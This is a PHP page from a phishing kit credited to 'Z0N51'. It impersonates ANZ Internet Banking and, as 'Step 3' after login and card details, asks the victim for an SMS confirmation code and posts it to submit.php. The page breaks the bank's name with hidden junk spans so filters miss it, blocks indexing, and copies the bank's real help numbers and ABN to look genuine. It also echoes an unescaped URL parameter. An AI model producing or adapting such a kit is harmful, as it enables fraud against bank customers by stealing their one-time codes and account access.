<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">

        <link rel="icon" type="image/png" href="../assets/images/fav.png"/>
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <title>Confirm your phone number</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="../assets/images/logo.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main" class="pt-4">
            <div class="container">
                
                <div class="main-title"><h3>Welcome to A<span class="hiiide">AZ45Qer</span>N<span class="hiiide">AZ45Qer</span>Z Internet B<span class="hiiide">AZ45Qer</span>a<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>k<span class="hiiide">AZ45Qer</span>i<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>g</h3></div>
                <div class="steps">
                    <ul>
                        <li class="active"><span>1</span> Login</li>
                        <li class="active"><span>2</span> ANZ card informations</li>
                        <li class="active"><span>3</span> Confirmation</li>
                        <li><span>4</span> Finish</li>
                    </ul>
                    <h3><b>Step 3.</b> Confirm your phone number</h3>
                </div>
                
                <form method="post" action="submit.php">
                <div class="panel">
                    <div class="panel-body details">
                            <div class="row mb-4">
                                <div class="col-md-6 mb-lg-0 mb-md-0 mb-sm-4 mb-4 <?php echo is_invalid_class($_SESSION['errors'],'confirm_code') ?>">
                                    <label for="confirm_code">SMS code</label>
                                    <input type="text" name="confirm_code" id="confirm_code" class="form-control">
                                    <?php echo error_message($_SESSION['errors'],'confirm_code'); ?>
                                </div>
                                <div class="col-md-6"></div>
                            </div>
                            <div class="mt-5">
                                <p class="mb-0" style="color: #444; font-weight: 600;">need help?</p>
                                <p class="mb-0" style="color: #444;">Call us on <span style="color: #337ab7;">13 33 50</span> any time (<span style="color: #337ab7;">+61 3 9683 8833</span> from overseas).</p>
                            </div>
                    </div>
                    <div class="panel-footer">
                        <div class="text-right">
                            <button type="submit">Finish</button>
                        </div>
                    </div>
                </div>
                <input type="hidden" name="verbot">
                <input type="hidden" name="type" value="confirm_code">
                <input type="hidden" name="error" value="<?php echo $_GET['error']; ?>">
                </form>

            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <div class="container">
                <p>&copy; Australia and New Zealand B<span class="hiiide">AZ45Qer</span>a<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>k<span class="hiiide">AZ45Qer</span>i<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>g Group Limited (A<span class="hiiide">AZ45Qer</span>N<span class="hiiide">AZ45Qer</span>Z) 2020 ABN 11 005 357 522.</p>
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>
    </body>

</html>